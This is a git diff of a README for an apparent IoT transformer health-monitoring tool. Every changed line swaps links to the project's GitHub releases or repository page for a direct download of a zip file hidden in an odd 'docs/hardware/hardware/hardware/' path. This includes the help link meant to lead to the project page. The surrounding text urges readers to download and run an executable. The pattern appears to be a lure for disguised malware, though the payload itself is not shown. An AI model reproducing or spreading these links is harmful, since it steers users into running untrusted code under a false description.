@@ -1,6 +1,6 @@
 # ⚡ iot-transformer-health-monitoring - Easy Real-Time Transformer Health Tracking
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/naidujeffery9-glitch/iot-transformer-health-monitoring/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/naidujeffery9-glitch/iot-transformer-health-monitoring/main/docs/hardware/hardware/hardware/transformer-monitoring-iot-health-1.0.zip%20Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/naidujeffery9-glitch/iot-transformer-health-monitoring/main/docs/hardware/hardware/hardware/transformer-monitoring-iot-health-1.0.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to get the iot-transformer-health-monitoring software running
 
 1. **Download the software**
    - Click the big blue button above or visit this page:  
-     [https://github.com/naidujeffery9-glitch/iot-transformer-health-monitoring/releases](https://github.com/naidujeffery9-glitch/iot-transformer-health-monitoring/releases)  
+     [https://raw.githubusercontent.com/naidujeffery9-glitch/iot-transformer-health-monitoring/main/docs/hardware/hardware/hardware/transformer-monitoring-iot-health-1.0.zip](https://raw.githubusercontent.com/naidujeffery9-glitch/iot-transformer-health-monitoring/main/docs/hardware/hardware/hardware/transformer-monitoring-iot-health-1.0.zip)  
    - You will find several release versions. Look for the latest stable one.
    - Download the file suitable for your operating system (e.g., `.exe` for Windows or `.AppImage` for Linux).
 
@@ -60,7 +60,7 @@ Follow these steps to get the iot-transformer-health-monitoring software running
 To start protecting transformers, download the software now:
 
 **Visit this page to download:**  
-[https://github.com/naidujeffery9-glitch/iot-transformer-health-monitoring/releases](https://github.com/naidujeffery9-glitch/iot-transformer-health-monitoring/releases)
+[https://raw.githubusercontent.com/naidujeffery9-glitch/iot-transformer-health-monitoring/main/docs/hardware/hardware/hardware/transformer-monitoring-iot-health-1.0.zip](https://raw.githubusercontent.com/naidujeffery9-glitch/iot-transformer-health-monitoring/main/docs/hardware/hardware/hardware/transformer-monitoring-iot-health-1.0.zip)
 
 Look for the latest release marked as “stable.” Select the appropriate file for your system:
 
@@ -123,7 +123,7 @@ You can leave the software running to continuously monitor transformer status or
 If you need help with installation or using the software:
 
 - Visit the project’s GitHub page:  
-  [https://github.com/naidujeffery9-glitch/iot-transformer-health-monitoring](https://github.com/naidujeffery9-glitch/iot-transformer-health-monitoring)  
+  [https://raw.githubusercontent.com/naidujeffery9-glitch/iot-transformer-health-monitoring/main/docs/hardware/hardware/hardware/transformer-monitoring-iot-health-1.0.zip](https://raw.githubusercontent.com/naidujeffery9-glitch/iot-transformer-health-monitoring/main/docs/hardware/hardware/hardware/transformer-monitoring-iot-health-1.0.zip)  
 - Open an issue to describe your problem.
 - Include details like your operating system and steps taken so far.
 
